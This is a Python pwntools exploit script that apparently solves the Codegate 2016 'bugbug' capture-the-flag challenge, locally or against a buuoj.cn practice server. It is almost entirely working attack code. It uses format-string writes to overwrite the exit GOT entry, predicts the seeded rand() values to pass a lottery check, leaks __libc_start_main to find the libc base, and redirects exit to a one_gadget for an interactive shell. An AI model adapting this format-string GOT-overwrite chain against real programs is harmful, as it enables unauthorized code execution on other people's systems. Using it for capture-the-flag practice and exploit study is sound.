import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bugbug_codegate_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bugbug_codegate_2016')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',26070)
			elf=ELF('./bugbug_codegate_2016')
			libc=ELF('../../i386libc/x86_libc.so.6')

		lib=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6' )
		start=0x8048843
		array=0x08049F08
		pay=p32(elf.got['exit']) + "%." + str(0x8580 - 3) + "d%17$hn"
		pay=pay.ljust(0x64,'a')
		io.recv()
		io.send(pay)
		io.recvuntil(pay)
		rand=u32(io.recv(4))
		lib.srand(rand)
		# gdb.attach(io)
		# pause()
		io.recvuntil('==> ')
		io.sendline(str(lib.rand()%45+1)+' '+str(lib.rand()%45+1)+' '+str(lib.rand()%45+1)+' '+str(lib.rand()%45+1)+' '+str(lib.rand()%45+1)+' '+str(lib.rand()%45+1))
		




		pay=p32(elf.got['__libc_start_main']) + "%17$s"
		pay=pay.ljust(0x64,'a')
		io.recvuntil('Who are you?')
		io.send(pay)
		io.recvuntil(pay)
		rand=u32(io.recv(4))
		lib1=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6' )
		lib1.srand(rand)
		io.recvuntil('==> ')
		io.sendline(str(lib1.rand()%45+1)+' '+str(lib1.rand()%45+1)+' '+str(lib1.rand()%45+1)+' '+str(lib1.rand()%45+1)+' '+str(lib1.rand()%45+1)+' '+str(lib1.rand()%45+1))
		io.recvuntil("Congratulation, ")
		io.recv(4)
		__libc_start_main=u32(io.recv(4))
		libc_base=__libc_start_main-libc.symbols['__libc_start_main']



		one_gadget=libc_base+0x5f066
		one_gadget1=one_gadget>>16
		one_gadget2=one_gadget%(0x10000)
		io.recvuntil("Who are you? ")
		pay=p32(elf.got['exit'])+p32(elf.got['exit']+2)
		pay+="%"+str(one_gadget2-8)+"d"+"%17$hn%"+str(one_gadget1-one_gadget2)+"d%18$hn"
		pay=pay.ljust(0x64,'a')
		io.send(pay)
		io.recvuntil(pay)
		rand=u32(io.recv(4))
		lib2=cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6' )
		lib2.srand(rand)
		io.recvuntil('==> ')
		io.sendline(str(lib2.rand()%45+1)+' '+str(lib2.rand()%45+1)+' '+str(lib2.rand()%45+1)+' '+str(lib2.rand()%45+1)+' '+str(lib2.rand()%45+1)+' '+str(lib2.rand()%45+1))


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue